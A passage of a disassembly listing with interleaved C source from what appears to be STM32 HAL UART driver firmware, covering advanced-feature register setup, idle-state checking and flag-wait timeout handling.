  /* if required, configure RX/TX pins swap */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_SWAP_INIT))
 8005994:	687b      	ldr	r3, [r7, #4]
 8005996:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005998:	f003 0308 	and.w	r3, r3, #8
 800599c:	2b00      	cmp	r3, #0
 800599e:	d00a      	beq.n	80059b6 <UART_AdvFeatureConfig+0x2a>
  {
    assert_param(IS_UART_ADVFEATURE_SWAP(huart->AdvancedInit.Swap));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_SWAP, huart->AdvancedInit.Swap);
 80059a0:	687b      	ldr	r3, [r7, #4]
 80059a2:	681b      	ldr	r3, [r3, #0]
 80059a4:	685b      	ldr	r3, [r3, #4]
 80059a6:	f423 4100 	bic.w	r1, r3, #32768	; 0x8000
 80059aa:	687b      	ldr	r3, [r7, #4]
 80059ac:	6b5a      	ldr	r2, [r3, #52]	; 0x34
 80059ae:	687b      	ldr	r3, [r7, #4]
 80059b0:	681b      	ldr	r3, [r3, #0]
 80059b2:	430a      	orrs	r2, r1
 80059b4:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure TX pin active level inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_TXINVERT_INIT))
 80059b6:	687b      	ldr	r3, [r7, #4]
 80059b8:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80059ba:	f003 0301 	and.w	r3, r3, #1
 80059be:	2b00      	cmp	r3, #0
 80059c0:	d00a      	beq.n	80059d8 <UART_AdvFeatureConfig+0x4c>
  {
    assert_param(IS_UART_ADVFEATURE_TXINV(huart->AdvancedInit.TxPinLevelInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_TXINV, huart->AdvancedInit.TxPinLevelInvert);
 80059c2:	687b      	ldr	r3, [r7, #4]
 80059c4:	681b      	ldr	r3, [r3, #0]
 80059c6:	685b      	ldr	r3, [r3, #4]
 80059c8:	f423 3100 	bic.w	r1, r3, #131072	; 0x20000
 80059cc:	687b      	ldr	r3, [r7, #4]
 80059ce:	6a9a      	ldr	r2, [r3, #40]	; 0x28
 80059d0:	687b      	ldr	r3, [r7, #4]
 80059d2:	681b      	ldr	r3, [r3, #0]
 80059d4:	430a      	orrs	r2, r1
 80059d6:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure RX pin active level inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_RXINVERT_INIT))
 80059d8:	687b      	ldr	r3, [r7, #4]
 80059da:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80059dc:	f003 0302 	and.w	r3, r3, #2
 80059e0:	2b00      	cmp	r3, #0
 80059e2:	d00a      	beq.n	80059fa <UART_AdvFeatureConfig+0x6e>
  {
    assert_param(IS_UART_ADVFEATURE_RXINV(huart->AdvancedInit.RxPinLevelInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_RXINV, huart->AdvancedInit.RxPinLevelInvert);
 80059e4:	687b      	ldr	r3, [r7, #4]
 80059e6:	681b      	ldr	r3, [r3, #0]
 80059e8:	685b      	ldr	r3, [r3, #4]
 80059ea:	f423 3180 	bic.w	r1, r3, #65536	; 0x10000
 80059ee:	687b      	ldr	r3, [r7, #4]
 80059f0:	6ada      	ldr	r2, [r3, #44]	; 0x2c
 80059f2:	687b      	ldr	r3, [r7, #4]
 80059f4:	681b      	ldr	r3, [r3, #0]
 80059f6:	430a      	orrs	r2, r1
 80059f8:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure data inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_DATAINVERT_INIT))
 80059fa:	687b      	ldr	r3, [r7, #4]
 80059fc:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80059fe:	f003 0304 	and.w	r3, r3, #4
 8005a02:	2b00      	cmp	r3, #0
 8005a04:	d00a      	beq.n	8005a1c <UART_AdvFeatureConfig+0x90>
  {
    assert_param(IS_UART_ADVFEATURE_DATAINV(huart->AdvancedInit.DataInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_DATAINV, huart->AdvancedInit.DataInvert);
 8005a06:	687b      	ldr	r3, [r7, #4]
 8005a08:	681b      	ldr	r3, [r3, #0]
 8005a0a:	685b      	ldr	r3, [r3, #4]
 8005a0c:	f423 2180 	bic.w	r1, r3, #262144	; 0x40000
 8005a10:	687b      	ldr	r3, [r7, #4]
 8005a12:	6b1a      	ldr	r2, [r3, #48]	; 0x30
 8005a14:	687b      	ldr	r3, [r7, #4]
 8005a16:	681b      	ldr	r3, [r3, #0]
 8005a18:	430a      	orrs	r2, r1
 8005a1a:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure RX overrun detection disabling */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_RXOVERRUNDISABLE_INIT))
 8005a1c:	687b      	ldr	r3, [r7, #4]
 8005a1e:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005a20:	f003 0310 	and.w	r3, r3, #16
 8005a24:	2b00      	cmp	r3, #0
 8005a26:	d00a      	beq.n	8005a3e <UART_AdvFeatureConfig+0xb2>
  {
    assert_param(IS_UART_OVERRUN(huart->AdvancedInit.OverrunDisable));
    MODIFY_REG(huart->Instance->CR3, USART_CR3_OVRDIS, huart->AdvancedInit.OverrunDisable);
 8005a28:	687b      	ldr	r3, [r7, #4]
 8005a2a:	681b      	ldr	r3, [r3, #0]
 8005a2c:	689b      	ldr	r3, [r3, #8]
 8005a2e:	f423 5180 	bic.w	r1, r3, #4096	; 0x1000
 8005a32:	687b      	ldr	r3, [r7, #4]
 8005a34:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 8005a36:	687b      	ldr	r3, [r7, #4]
 8005a38:	681b      	ldr	r3, [r3, #0]
 8005a3a:	430a      	orrs	r2, r1
 8005a3c:	609a      	str	r2, [r3, #8]
  }

  /* if required, configure DMA disabling on reception error */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_DMADISABLEONERROR_INIT))
 8005a3e:	687b      	ldr	r3, [r7, #4]
 8005a40:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005a42:	f003 0320 	and.w	r3, r3, #32
 8005a46:	2b00      	cmp	r3, #0
 8005a48:	d00a      	beq.n	8005a60 <UART_AdvFeatureConfig+0xd4>
  {
    assert_param(IS_UART_ADVFEATURE_DMAONRXERROR(huart->AdvancedInit.DMADisableonRxError));
    MODIFY_REG(huart->Instance->CR3, USART_CR3_DDRE, huart->AdvancedInit.DMADisableonRxError);
 8005a4a:	687b      	ldr	r3, [r7, #4]
 8005a4c:	681b      	ldr	r3, [r3, #0]
 8005a4e:	689b      	ldr	r3, [r3, #8]
 8005a50:	f423 5100 	bic.w	r1, r3, #8192	; 0x2000
 8005a54:	687b      	ldr	r3, [r7, #4]
 8005a56:	6bda      	ldr	r2, [r3, #60]	; 0x3c
 8005a58:	687b      	ldr	r3, [r7, #4]
 8005a5a:	681b      	ldr	r3, [r3, #0]
 8005a5c:	430a      	orrs	r2, r1
 8005a5e:	609a      	str	r2, [r3, #8]
  }

  /* if required, configure auto Baud rate detection scheme */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_AUTOBAUDRATE_INIT))
 8005a60:	687b      	ldr	r3, [r7, #4]
 8005a62:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005a64:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8005a68:	2b00      	cmp	r3, #0
 8005a6a:	d01a      	beq.n	8005aa2 <UART_AdvFeatureConfig+0x116>
  {
    assert_param(IS_USART_AUTOBAUDRATE_DETECTION_INSTANCE(huart->Instance));
    assert_param(IS_UART_ADVFEATURE_AUTOBAUDRATE(huart->AdvancedInit.AutoBaudRateEnable));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_ABREN, huart->AdvancedInit.AutoBaudRateEnable);
 8005a6c:	687b      	ldr	r3, [r7, #4]
 8005a6e:	681b      	ldr	r3, [r3, #0]
 8005a70:	685b      	ldr	r3, [r3, #4]
 8005a72:	f423 1180 	bic.w	r1, r3, #1048576	; 0x100000
 8005a76:	687b      	ldr	r3, [r7, #4]
 8005a78:	6c1a      	ldr	r2, [r3, #64]	; 0x40
 8005a7a:	687b      	ldr	r3, [r7, #4]
 8005a7c:	681b      	ldr	r3, [r3, #0]
 8005a7e:	430a      	orrs	r2, r1
 8005a80:	605a      	str	r2, [r3, #4]
    /* set auto Baudrate detection parameters if detection is enabled */
    if (huart->AdvancedInit.AutoBaudRateEnable == UART_ADVFEATURE_AUTOBAUDRATE_ENABLE)
 8005a82:	687b      	ldr	r3, [r7, #4]
 8005a84:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8005a86:	f5b3 1f80 	cmp.w	r3, #1048576	; 0x100000
 8005a8a:	d10a      	bne.n	8005aa2 <UART_AdvFeatureConfig+0x116>
    {
      assert_param(IS_UART_ADVFEATURE_AUTOBAUDRATEMODE(huart->AdvancedInit.AutoBaudRateMode));
      MODIFY_REG(huart->Instance->CR2, USART_CR2_ABRMODE, huart->AdvancedInit.AutoBaudRateMode);
 8005a8c:	687b      	ldr	r3, [r7, #4]
 8005a8e:	681b      	ldr	r3, [r3, #0]
 8005a90:	685b      	ldr	r3, [r3, #4]
 8005a92:	f423 01c0 	bic.w	r1, r3, #6291456	; 0x600000
 8005a96:	687b      	ldr	r3, [r7, #4]
 8005a98:	6c5a      	ldr	r2, [r3, #68]	; 0x44
 8005a9a:	687b      	ldr	r3, [r7, #4]
 8005a9c:	681b      	ldr	r3, [r3, #0]
 8005a9e:	430a      	orrs	r2, r1
 8005aa0:	605a      	str	r2, [r3, #4]
    }
  }

  /* if required, configure MSB first on communication line */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_MSBFIRST_INIT))
 8005aa2:	687b      	ldr	r3, [r7, #4]
 8005aa4:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005aa6:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8005aaa:	2b00      	cmp	r3, #0
 8005aac:	d00a      	beq.n	8005ac4 <UART_AdvFeatureConfig+0x138>
  {
    assert_param(IS_UART_ADVFEATURE_MSBFIRST(huart->AdvancedInit.MSBFirst));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_MSBFIRST, huart->AdvancedInit.MSBFirst);
 8005aae:	687b      	ldr	r3, [r7, #4]
 8005ab0:	681b      	ldr	r3, [r3, #0]
 8005ab2:	685b      	ldr	r3, [r3, #4]
 8005ab4:	f423 2100 	bic.w	r1, r3, #524288	; 0x80000
 8005ab8:	687b      	ldr	r3, [r7, #4]
 8005aba:	6c9a      	ldr	r2, [r3, #72]	; 0x48
 8005abc:	687b      	ldr	r3, [r7, #4]
 8005abe:	681b      	ldr	r3, [r3, #0]
 8005ac0:	430a      	orrs	r2, r1
 8005ac2:	605a      	str	r2, [r3, #4]
  }
}
 8005ac4:	bf00      	nop
 8005ac6:	370c      	adds	r7, #12
 8005ac8:	46bd      	mov	sp, r7
 8005aca:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005ace:	4770      	bx	lr

08005ad0 <UART_CheckIdleState>:
  * @brief Check the UART Idle State.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef UART_CheckIdleState(UART_HandleTypeDef *huart)
{
 8005ad0:	b580      	push	{r7, lr}
 8005ad2:	b098      	sub	sp, #96	; 0x60
 8005ad4:	af02      	add	r7, sp, #8
 8005ad6:	6078      	str	r0, [r7, #4]
  uint32_t tickstart;

  /* Initialize the UART ErrorCode */
  huart->ErrorCode = HAL_UART_ERROR_NONE;
 8005ad8:	687b      	ldr	r3, [r7, #4]
 8005ada:	2200      	movs	r2, #0
 8005adc:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

  /* Init tickstart for timeout management */
  tickstart = HAL_GetTick();
 8005ae0:	f7fb fb62 	bl	80011a8 <HAL_GetTick>
 8005ae4:	6578      	str	r0, [r7, #84]	; 0x54

  /* Check if the Transmitter is enabled */
  if ((huart->Instance->CR1 & USART_CR1_TE) == USART_CR1_TE)
 8005ae6:	687b      	ldr	r3, [r7, #4]
 8005ae8:	681b      	ldr	r3, [r3, #0]
 8005aea:	681b      	ldr	r3, [r3, #0]
 8005aec:	f003 0308 	and.w	r3, r3, #8
 8005af0:	2b08      	cmp	r3, #8
 8005af2:	d12e      	bne.n	8005b52 <UART_CheckIdleState+0x82>
  {
    /* Wait until TEACK flag is set */
    if (UART_WaitOnFlagUntilTimeout(huart, USART_ISR_TEACK, RESET, tickstart, HAL_UART_TIMEOUT_VALUE) != HAL_OK)
 8005af4:	f06f 437e 	mvn.w	r3, #4261412864	; 0xfe000000
 8005af8:	9300      	str	r3, [sp, #0]
 8005afa:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8005afc:	2200      	movs	r2, #0
 8005afe:	f44f 1100 	mov.w	r1, #2097152	; 0x200000
 8005b02:	6878      	ldr	r0, [r7, #4]
 8005b04:	f000 f88c 	bl	8005c20 <UART_WaitOnFlagUntilTimeout>
 8005b08:	4603      	mov	r3, r0
 8005b0a:	2b00      	cmp	r3, #0
 8005b0c:	d021      	beq.n	8005b52 <UART_CheckIdleState+0x82>
    {
      /* Disable TXE interrupt for the interrupt process */
#if defined(USART_CR1_FIFOEN)
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_TXEIE_TXFNFIE));
#else
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_TXEIE));
 8005b0e:	687b      	ldr	r3, [r7, #4]
 8005b10:	681b      	ldr	r3, [r3, #0]
 8005b12:	63bb      	str	r3, [r7, #56]	; 0x38
 */
__STATIC_FORCEINLINE uint32_t __LDREXW(volatile uint32_t *addr)
{
    uint32_t result;

   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005b14:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8005b16:	e853 3f00 	ldrex	r3, [r3]
 8005b1a:	637b      	str	r3, [r7, #52]	; 0x34
   return(result);
 8005b1c:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8005b1e:	f023 0380 	bic.w	r3, r3, #128	; 0x80
 8005b22:	653b      	str	r3, [r7, #80]	; 0x50
 8005b24:	687b      	ldr	r3, [r7, #4]
 8005b26:	681b      	ldr	r3, [r3, #0]
 8005b28:	461a      	mov	r2, r3
 8005b2a:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8005b2c:	647b      	str	r3, [r7, #68]	; 0x44
 8005b2e:	643a      	str	r2, [r7, #64]	; 0x40
 */
__STATIC_FORCEINLINE uint32_t __STREXW(uint32_t value, volatile uint32_t *addr)
{
   uint32_t result;

   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005b30:	6c39      	ldr	r1, [r7, #64]	; 0x40
 8005b32:	6c7a      	ldr	r2, [r7, #68]	; 0x44
 8005b34:	e841 2300 	strex	r3, r2, [r1]
 8005b38:	63fb      	str	r3, [r7, #60]	; 0x3c
   return(result);
 8005b3a:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8005b3c:	2b00      	cmp	r3, #0
 8005b3e:	d1e6      	bne.n	8005b0e <UART_CheckIdleState+0x3e>
#endif /* USART_CR1_FIFOEN */

      huart->gState = HAL_UART_STATE_READY;
 8005b40:	687b      	ldr	r3, [r7, #4]
 8005b42:	2220      	movs	r2, #32
 8005b44:	67da      	str	r2, [r3, #124]	; 0x7c

      __HAL_UNLOCK(huart);
 8005b46:	687b      	ldr	r3, [r7, #4]
 8005b48:	2200      	movs	r2, #0
 8005b4a:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

      /* Timeout occurred */
      return HAL_TIMEOUT;
 8005b4e:	2303      	movs	r3, #3
 8005b50:	e062      	b.n	8005c18 <UART_CheckIdleState+0x148>
    }
  }

  /* Check if the Receiver is enabled */
  if ((huart->Instance->CR1 & USART_CR1_RE) == USART_CR1_RE)
 8005b52:	687b      	ldr	r3, [r7, #4]
 8005b54:	681b      	ldr	r3, [r3, #0]
 8005b56:	681b      	ldr	r3, [r3, #0]
 8005b58:	f003 0304 	and.w	r3, r3, #4
 8005b5c:	2b04      	cmp	r3, #4
 8005b5e:	d149      	bne.n	8005bf4 <UART_CheckIdleState+0x124>
  {
    /* Wait until REACK flag is set */
    if (UART_WaitOnFlagUntilTimeout(huart, USART_ISR_REACK, RESET, tickstart, HAL_UART_TIMEOUT_VALUE) != HAL_OK)
 8005b60:	f06f 437e 	mvn.w	r3, #4261412864	; 0xfe000000
 8005b64:	9300      	str	r3, [sp, #0]
 8005b66:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8005b68:	2200      	movs	r2, #0
 8005b6a:	f44f 0180 	mov.w	r1, #4194304	; 0x400000
 8005b6e:	6878      	ldr	r0, [r7, #4]
 8005b70:	f000 f856 	bl	8005c20 <UART_WaitOnFlagUntilTimeout>
 8005b74:	4603      	mov	r3, r0
 8005b76:	2b00      	cmp	r3, #0
 8005b78:	d03c      	beq.n	8005bf4 <UART_CheckIdleState+0x124>
      /* Disable RXNE, PE and ERR (Frame error, noise error, overrun error)
      interrupts for the interrupt process */
#if defined(USART_CR1_FIFOEN)
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE_RXFNEIE | USART_CR1_PEIE));
#else
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE | USART_CR1_PEIE));
 8005b7a:	687b      	ldr	r3, [r7, #4]
 8005b7c:	681b      	ldr	r3, [r3, #0]
 8005b7e:	627b      	str	r3, [r7, #36]	; 0x24
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005b80:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005b82:	e853 3f00 	ldrex	r3, [r3]
 8005b86:	623b      	str	r3, [r7, #32]
   return(result);
 8005b88:	6a3b      	ldr	r3, [r7, #32]
 8005b8a:	f423 7390 	bic.w	r3, r3, #288	; 0x120
 8005b8e:	64fb      	str	r3, [r7, #76]	; 0x4c
 8005b90:	687b      	ldr	r3, [r7, #4]
 8005b92:	681b      	ldr	r3, [r3, #0]
 8005b94:	461a      	mov	r2, r3
 8005b96:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8005b98:	633b      	str	r3, [r7, #48]	; 0x30
 8005b9a:	62fa      	str	r2, [r7, #44]	; 0x2c
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005b9c:	6af9      	ldr	r1, [r7, #44]	; 0x2c
 8005b9e:	6b3a      	ldr	r2, [r7, #48]	; 0x30
 8005ba0:	e841 2300 	strex	r3, r2, [r1]
 8005ba4:	62bb      	str	r3, [r7, #40]	; 0x28
   return(result);
 8005ba6:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8005ba8:	2b00      	cmp	r3, #0
 8005baa:	d1e6      	bne.n	8005b7a <UART_CheckIdleState+0xaa>
#endif /* USART_CR1_FIFOEN */
      ATOMIC_CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);
 8005bac:	687b      	ldr	r3, [r7, #4]
 8005bae:	681b      	ldr	r3, [r3, #0]
 8005bb0:	3308      	adds	r3, #8
 8005bb2:	613b      	str	r3, [r7, #16]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005bb4:	693b      	ldr	r3, [r7, #16]
 8005bb6:	e853 3f00 	ldrex	r3, [r3]
 8005bba:	60fb      	str	r3, [r7, #12]
   return(result);
 8005bbc:	68fb      	ldr	r3, [r7, #12]
 8005bbe:	f023 0301 	bic.w	r3, r3, #1
 8005bc2:	64bb      	str	r3, [r7, #72]	; 0x48
 8005bc4:	687b      	ldr	r3, [r7, #4]
 8005bc6:	681b      	ldr	r3, [r3, #0]
 8005bc8:	3308      	adds	r3, #8
 8005bca:	6cba      	ldr	r2, [r7, #72]	; 0x48
 8005bcc:	61fa      	str	r2, [r7, #28]
 8005bce:	61bb      	str	r3, [r7, #24]
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005bd0:	69b9      	ldr	r1, [r7, #24]
 8005bd2:	69fa      	ldr	r2, [r7, #28]
 8005bd4:	e841 2300 	strex	r3, r2, [r1]
 8005bd8:	617b      	str	r3, [r7, #20]
   return(result);
 8005bda:	697b      	ldr	r3, [r7, #20]
 8005bdc:	2b00      	cmp	r3, #0
 8005bde:	d1e5      	bne.n	8005bac <UART_CheckIdleState+0xdc>

      huart->RxState = HAL_UART_STATE_READY;
 8005be0:	687b      	ldr	r3, [r7, #4]
 8005be2:	2220      	movs	r2, #32
 8005be4:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80

      __HAL_UNLOCK(huart);
 8005be8:	687b      	ldr	r3, [r7, #4]
 8005bea:	2200      	movs	r2, #0
 8005bec:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

      /* Timeout occurred */
      return HAL_TIMEOUT;
 8005bf0:	2303      	movs	r3, #3
 8005bf2:	e011      	b.n	8005c18 <UART_CheckIdleState+0x148>
    }
  }

  /* Initialize the UART State */
  huart->gState = HAL_UART_STATE_READY;
 8005bf4:	687b      	ldr	r3, [r7, #4]
 8005bf6:	2220      	movs	r2, #32
 8005bf8:	67da      	str	r2, [r3, #124]	; 0x7c
  huart->RxState = HAL_UART_STATE_READY;
 8005bfa:	687b      	ldr	r3, [r7, #4]
 8005bfc:	2220      	movs	r2, #32
 8005bfe:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80
  huart->ReceptionType = HAL_UART_RECEPTION_STANDARD;
 8005c02:	687b      	ldr	r3, [r7, #4]
 8005c04:	2200      	movs	r2, #0
 8005c06:	661a      	str	r2, [r3, #96]	; 0x60
  huart->RxEventType = HAL_UART_RXEVENT_TC;
 8005c08:	687b      	ldr	r3, [r7, #4]
 8005c0a:	2200      	movs	r2, #0
 8005c0c:	665a      	str	r2, [r3, #100]	; 0x64

  __HAL_UNLOCK(huart);
 8005c0e:	687b      	ldr	r3, [r7, #4]
 8005c10:	2200      	movs	r2, #0
 8005c12:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

  return HAL_OK;
 8005c16:	2300      	movs	r3, #0
}
 8005c18:	4618      	mov	r0, r3
 8005c1a:	3758      	adds	r7, #88	; 0x58
 8005c1c:	46bd      	mov	sp, r7
 8005c1e:	bd80      	pop	{r7, pc}

08005c20 <UART_WaitOnFlagUntilTimeout>:
  * @param Timeout   Timeout duration
  * @retval HAL status
  */
HAL_StatusTypeDef UART_WaitOnFlagUntilTimeout(UART_HandleTypeDef *huart, uint32_t Flag, FlagStatus Status,
                                              uint32_t Tickstart, uint32_t Timeout)
{
 8005c20:	b580      	push	{r7, lr}
 8005c22:	b084      	sub	sp, #16
 8005c24:	af00      	add	r7, sp, #0
 8005c26:	60f8      	str	r0, [r7, #12]
 8005c28:	60b9      	str	r1, [r7, #8]
 8005c2a:	603b      	str	r3, [r7, #0]
 8005c2c:	4613      	mov	r3, r2
 8005c2e:	71fb      	strb	r3, [r7, #7]
  /* Wait until flag is set */
  while ((__HAL_UART_GET_FLAG(huart, Flag) ? SET : RESET) == Status)
 8005c30:	e049      	b.n	8005cc6 <UART_WaitOnFlagUntilTimeout+0xa6>
  {
    /* Check for the Timeout */
    if (Timeout != HAL_MAX_DELAY)
 8005c32:	69bb      	ldr	r3, [r7, #24]
 8005c34:	f1b3 3fff 	cmp.w	r3, #4294967295
 8005c38:	d045      	beq.n	8005cc6 <UART_WaitOnFlagUntilTimeout+0xa6>
    {
      if (((HAL_GetTick() - Tickstart) > Timeout) || (Timeout == 0U))
 8005c3a:	f7fb fab5 	bl	80011a8 <HAL_GetTick>
 8005c3e:	4602      	mov	r2, r0
 8005c40:	683b      	ldr	r3, [r7, #0]
 8005c42:	1ad3      	subs	r3, r2, r3
 8005c44:	69ba      	ldr	r2, [r7, #24]
 8005c46:	429a      	cmp	r2, r3
 8005c48:	d302      	bcc.n	8005c50 <UART_WaitOnFlagUntilTimeout+0x30>
 8005c4a:	69bb      	ldr	r3, [r7, #24]
 8005c4c:	2b00      	cmp	r3, #0
 8005c4e:	d101      	bne.n	8005c54 <UART_WaitOnFlagUntilTimeout+0x34>
      {

        return HAL_TIMEOUT;
 8005c50:	2303      	movs	r3, #3
 8005c52:	e048      	b.n	8005ce6 <UART_WaitOnFlagUntilTimeout+0xc6>
      }

      if (READ_BIT(huart->Instance->CR1, USART_CR1_RE) != 0U)
 8005c54:	68fb      	ldr	r3, [r7, #12]
 8005c56:	681b      	ldr	r3, [r3, #0]
 8005c58:	681b      	ldr	r3, [r3, #0]
 8005c5a:	f003 0304 	and.w	r3, r3, #4
 8005c5e:	2b00      	cmp	r3, #0
 8005c60:	d031      	beq.n	8005cc6 <UART_WaitOnFlagUntilTimeout+0xa6>
      {
        if (__HAL_UART_GET_FLAG(huart, UART_FLAG_ORE) == SET)
 8005c62:	68fb      	ldr	r3, [r7, #12]
 8005c64:	681b      	ldr	r3, [r3, #0]
 8005c66:	69db      	ldr	r3, [r3, #28]
 8005c68:	f003 0308 	and.w	r3, r3, #8
 8005c6c:	2b08      	cmp	r3, #8
 8005c6e:	d110      	bne.n	8005c92 <UART_WaitOnFlagUntilTimeout+0x72>
        {
          /* Clear Overrun Error flag*/
          __HAL_UART_CLEAR_FLAG(huart, UART_CLEAR_OREF);
 8005c70:	68fb      	ldr	r3, [r7, #12]
 8005c72:	681b      	ldr	r3, [r3, #0]
 8005c74:	2208      	movs	r2, #8
 8005c76:	621a      	str	r2, [r3, #32]

          /* Blocking error : transfer is aborted
          Set the UART state ready to be able to start again the process,
          Disable Rx Interrupts if ongoing */
          UART_EndRxTransfer(huart);
 8005c78:	68f8      	ldr	r0, [r7, #12]
 8005c7a:	f000 f838 	bl	8005cee <UART_EndRxTransfer>

          huart->ErrorCode = HAL_UART_ERROR_ORE;
 8005c7e:	68fb      	ldr	r3, [r7, #12]
 8005c80:	2208      	movs	r2, #8
 8005c82:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

          /* Process Unlocked */
          __HAL_UNLOCK(huart);
 8005c86:	68fb      	ldr	r3, [r7, #12]
 8005c88:	2200      	movs	r2, #0
 8005c8a:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

          return HAL_ERROR;
 8005c8e:	2301      	movs	r3, #1
 8005c90:	e029      	b.n	8005ce6 <UART_WaitOnFlagUntilTimeout+0xc6>
        }
        if (__HAL_UART_GET_FLAG(huart, UART_FLAG_RTOF) == SET)
 8005c92:	68fb      	ldr	r3, [r7, #12]
 8005c94:	681b      	ldr	r3, [r3, #0]
 8005c96:	69db      	ldr	r3, [r3, #28]
 8005c98:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8005c9c:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 8005ca0:	d111      	bne.n	8005cc6 <UART_WaitOnFlagUntilTimeout+0xa6>
        {
          /* Clear Receiver Timeout flag*/
          __HAL_UART_CLEAR_FLAG(huart, UART_CLEAR_RTOF);
 8005ca2:	68fb      	ldr	r3, [r7, #12]
 8005ca4:	681b      	ldr	r3, [r3, #0]
 8005ca6:	f44f 6200 	mov.w	r2, #2048	; 0x800
 8005caa:	621a      	str	r2, [r3, #32]

          /* Blocking error : transfer is aborted
          Set the UART state ready to be able to start again the process,
          Disable Rx Interrupts if ongoing */
          UART_EndRxTransfer(huart);
 8005cac:	68f8      	ldr	r0, [r7, #12]
 8005cae:	f000 f81e 	bl	8005cee <UART_EndRxTransfer>

          huart->ErrorCode = HAL_UART_ERROR_RTO;
 8005cb2:	68fb      	ldr	r3, [r7, #12]
 8005cb4:	2220      	movs	r2, #32
 8005cb6:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

          /* Process Unlocked */
          __HAL_UNLOCK(huart);
 8005cba:	68fb      	ldr	r3, [r7, #12]
 8005cbc:	2200      	movs	r2, #0
 8005cbe:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

          return HAL_TIMEOUT;
 8005cc2:	2303      	movs	r3, #3
 8005cc4:	e00f      	b.n	8005ce6 <UART_WaitOnFlagUntilTimeout+0xc6>
  while ((__HAL_UART_GET_FLAG(huart, Flag) ? SET : RESET) == Status)
 8005cc6:	68fb      	ldr	r3, [r7, #12]
 8005cc8:	681b      	ldr	r3, [r3, #0]
 8005cca:	69da      	ldr	r2, [r3, #28]
 8005ccc:	68bb      	ldr	r3, [r7, #8]
 8005cce:	4013      	ands	r3, r2
 8005cd0:	68ba      	ldr	r2, [r7, #8]
 8005cd2:	429a      	cmp	r2, r3
 8005cd4:	bf0c      	ite	eq
 8005cd6:	2301      	moveq	r3, #1
 8005cd8:	2300      	movne	r3, #0
 8005cda:	b2db      	uxtb	r3, r3
 8005cdc:	461a      	mov	r2, r3
 8005cde:	79fb      	ldrb	r3, [r7, #7]
 8005ce0:	429a      	cmp	r2, r3
 8005ce2:	d0a6      	beq.n	8005c32 <UART_WaitOnFlagUntilTimeout+0x12>
        }
      }
    }
  }
  return HAL_OK;
 8005ce4:	2300      	movs	r3, #0
}
 8005ce6:	4618      	mov	r0, r3
 8005ce8:	3710      	adds	r7, #16
 8005cea:	46bd      	mov	sp, r7
 8005cec:	bd80      	pop	{r7, pc}

08005cee <UART_EndRxTransfer>:
  * @brief  End ongoing Rx transfer on UART peripheral (following error detection or Reception completion).
  * @param  huart UART handle.
  * @retval None
